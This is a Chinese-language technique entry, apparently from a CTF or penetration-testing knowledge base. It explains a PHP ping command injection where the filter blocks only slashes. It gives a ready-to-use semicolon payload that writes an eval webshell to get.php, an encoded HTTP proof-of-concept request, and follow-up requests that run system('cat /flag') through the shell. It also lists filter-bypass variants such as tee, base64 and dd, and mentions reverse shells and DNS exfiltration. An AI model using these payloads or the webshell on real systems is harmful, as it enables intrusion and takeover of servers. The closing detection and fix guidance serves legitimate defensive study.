---
id: web-php-rce-ping-slash-filter-semicolon-webshell-write
title: PHP ping 命令注入：只过滤斜杠时用分号注入并写入 WebShell
type: scenario
domain: web
path: web/php/rce
technique: php-ping-slash-filter-semicolon-webshell-write
aliases:
- ping 命令注入写马
- preg_match_all 斜杠过滤绕过
- exec ping 拼接
- 分号命令注入
- get.php 一句话木马
tags:
- php
- rce
- command-injection
- exec
- ping
- webshell
- filter-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V311
  verified_at: '2026-11-08T13:25:17+08:00'
  notes: '已对照图21 ping 源码（isset($_GET[''ip''])、preg_match_all(''/\//'') 仅过滤斜杠、exec("ping -c 4 {$ip}")）、图22 ls / 与图23 cat /flag 回显核对；payload ;echo "<?php eval(\$_GET[1]);?>" > get.php 与原文 URL 解码一致；已把 URL # 改为 fragment 语义的准确表述。未复现。'
---

## 一句话结论

PHP 把 `$ip` 直接拼进 `exec("ping -c 4 {$ip}")`，却只用 `preg_match_all("/\//", $ip, $m)` 检查是否含斜杠；提交不含斜杠的 `;echo "<?php eval($_GET[1]);?>" > get.php` 即可在 Web 目录写入一句话木马，再通过 `get.php?1=system("cat /flag")` 执行任意命令。

## 原理

- `exec()` 把字符串交给系统 shell（Linux `/bin/sh -c`），`;` 是命令分隔符；`ping -c 4` 会先执行（可能失败），随后执行 `;` 后的 `echo`。
- 代码的过滤条件只针对 `/` 字符：`if (!preg_match_all("/\//", $ip, $m)) { exec(...) }`；它没有过滤 `;`、`|`、`&`、反引号、`$()`，也没有做 IP 格式校验或 `escapeshellarg()`。
- 写入 payload 刻意避开斜杠：PHP 代码 `<?php eval($_GET[1]);?>` 不含 `/`，目标文件用相对路径 `get.php`，因此能通过斜杠检查。
- `>` 重定向把 `echo` 的内容写入当前工作目录下的 `get.php`；Web 服务器对该目录可写时，访问 `get.php` 即执行 PHP。
- 后续 `eval($_GET[1])` 使 `1` 参数成为任意 PHP 代码；`system("cat /flag")` 直接读取 flag。URL 中的 `#` 是 fragment，不会发送到服务端；即使进入 shell，本题 `$ip` 位于命令末尾、`ping` 后无其它参数，`#` 也非必需。

## 触发条件

- PHP 应用提供 ping/网络检测功能，`$ip` 来自 GET/POST 并拼进 `exec`/`system`/`shell_exec`。
- `exec` 未被 `disable_functions` 禁用。
- Web 目录对 PHP 进程可写，且写入的 `.php` 可被访问。
- 过滤只检查 `/` 或少数字符，未做 IP 白名单/转义。

## 利用步骤

1. 确认注入点：提交合法 IP（如 `127.0.0.1`）观察 ping 回显；再提交 `;id` 或 `;whoami` 验证命令执行。
2. 构造写文件 payload（不含斜杠）：`;echo "<?php eval(\$_GET[1]);?>" > get.php`。
3. URL 编码后发送到 `ip` 参数；或直接使用截图中的编码形式。
4. 访问 `http://target/get.php?1=system("ls /")` 确认木马可用。
5. 读取目标文件：`get.php?1=system("cat /flag")`；必要时写更稳定的 webshell 或反弹 shell。

## PoC

```http
GET /?ip=%3Becho+%22%3C%3Fphp+eval%28%5C%24_GET%5B1%5D%29%3B%3F%3E%22%3E+get.php HTTP/1.1
Host: target
```

解码后的注入值：

```text
;echo "<?php eval(\$_GET[1]);?>" > get.php
```

随后访问：

```http
GET /get.php?1=system("ls /") HTTP/1.1
GET /get.php?1=system("cat /flag") HTTP/1.1
```

## 变体与关联

- **斜杠确实需要**：可用 `cd` 进入目录、相对路径、`${PWD}`，或用 `printf`/`base64 -d` 生成带斜杠的内容，避免直接出现 `/`。
- **`>` 被过滤**：用 `tee get.php`、`cp`/`mv`、`dd of=get.php` 等替代。
- **引号被过滤**：用 Base64/hex 编码 payload 后再解码写入，或使用 PHP 短标签 `<?=`。
- **无回显**：用时间盲注 `;sleep 5`、DNS 外带、写文件后访问确认。
- **其他 ping 参数**：`$times`、`$count` 等若同样拼接，也可能是注入点；不要只测 `ip`。
- 关联：[[web-php-rce-icpas-ping-ip-exec-command-injection]]（同类 ping/exec 拼接）、[[web-php-rce-command-injection-blacklist-base64-tee-webshell]]（黑名单+字符集绕过后写 webshell）。

## 检测与防御

- **修复**：用 `filter_var($ip, FILTER_VALIDATE_IP)` 严格校验 IPv4/IPv6；次数等数值参数强制整数；使用 `escapeshellarg()` 对每个参数转义，或改用 `proc_open` 数组形式/原生 ICMP 库，避免拼接 shell。
- **加固**：`disable_functions` 禁用 `exec`/`system`/`shell_exec`/`passthru`；Web 目录不可写或禁止 PHP 解析；Web 进程最小权限。
- **检测**：请求参数中出现 `;`、`|`、`&`、反引号、`$(`、`>` 等 shell 元字符；Web 进程派生子 shell/`ping` 后紧跟 `echo`/`sh`；Web 目录新增 `.php` 文件。
